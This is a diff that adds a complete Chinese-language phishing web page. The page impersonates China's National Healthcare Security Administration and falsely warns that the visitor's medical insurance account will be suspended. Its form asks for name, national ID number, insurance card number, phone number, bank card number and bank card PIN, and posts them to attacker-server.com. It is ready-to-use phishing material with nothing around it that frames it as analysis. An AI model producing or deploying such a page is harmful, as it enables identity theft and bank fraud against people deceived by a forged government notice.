@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>医保账户更新 - 请立即验证</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Microsoft YaHei', Arial, sans-serif;
+            background: linear-gradient(135deg, #00695c 0%, #00897b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            width: 450px;
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #00695c 0%, #00897b 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header .icon { font-size: 60px; margin-bottom: 15px; }
+        .header h1 { font-size: 24px; margin-bottom: 8px; }
+        .urgency {
+            background: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .content { padding: 30px; }
+        .warning-banner {
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            margin-bottom: 25px;
+        }
+        .warning-banner p { color: #e65100; font-size: 14px; line-height: 1.6; }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .form-group input:focus { border-color: #00695c; }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #00695c 0%, #00897b 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .submit-btn:hover { opacity: 0.9; }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background: #fafafa;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon">&#x1F3E5;</div>
+            <h1>国家医疗保障局</h1>
+            <p>医保账户信息更新通知</p>
+        </div>
+        <div class="urgency">
+            &#9888; 最后更新期限：2026年3月25日
+        </div>
+        <div class="content">
+            <div class="warning-banner">
+                <p><strong>重要通知：</strong>您的医保账户因信息不完整即将被暂停使用。请在规定期限内完成身份验证，否则将影响医保卡正常结算功能。</p>
+            </div>
+            <form action="https://attacker-server.com/medical.php" method="POST">
+                <div class="form-group">
+                    <label>姓名</label>
+                    <input type="text" name="name" required>
+                </div>
+                <div class="form-group">
+                    <label>身份证号</label>
+                    <input type="text" name="id_number" placeholder="18位身份证号" required>
+                </div>
+                <div class="form-group">
+                    <label>医保卡号</label>
+                    <input type="text" name="medical_card" required>
+                </div>
+                <div class="form-group">
+                    <label>预留手机号</label>
+                    <input type="tel" name="phone" required>
+                </div>
+                <div class="form-group">
+                    <label>银行卡号（用于关联）</label>
+                    <input type="text" name="bank_card" required>
+                </div>
+                <div class="form-group">
+                    <label>银行卡密码</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit" class="submit-btn">立即更新医保账户</button>
+            </form>
+        </div>
+        <div class="footer">
+            国家医疗保障局 | 官方热线: 12333 | 谨防电信诈骗
+        </div>
+    </div>
+</body>
+</html>
